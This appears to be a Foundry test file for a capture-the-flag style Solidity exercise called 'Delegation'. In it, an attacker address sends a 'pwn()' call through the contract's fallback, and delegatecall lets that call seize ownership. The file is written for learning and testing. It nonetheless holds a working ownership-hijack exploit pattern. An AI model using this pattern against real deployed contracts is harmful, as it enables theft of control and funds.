// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Delegate, Delegation} from "../src/contracts/06_Delegation.sol";

contract TokenTest is Test {
    address private owner = makeAddr("owner");
    Delegate private delegate;
    Delegation private delegation;

    function setUp() public {
        vm.startPrank(owner);
        delegate = new Delegate(owner);
        delegation = new Delegation(address(delegate));
        vm.stopPrank();
    }

    function test_DelegationExploitVulnerability() public {
        address attacker = makeAddr("attacker");

        vm.prank(attacker);
        address(delegation).call(abi.encodeWithSignature("pwn()"));

        assertEq(
            delegate.owner(),
            owner,
            "The owner of the Delegate contract must NOT change"
        );

        assertEq(
            delegation.owner(),
            attacker,
            "The attacker must be the owner of the Delegation contract"
        );
    }
}
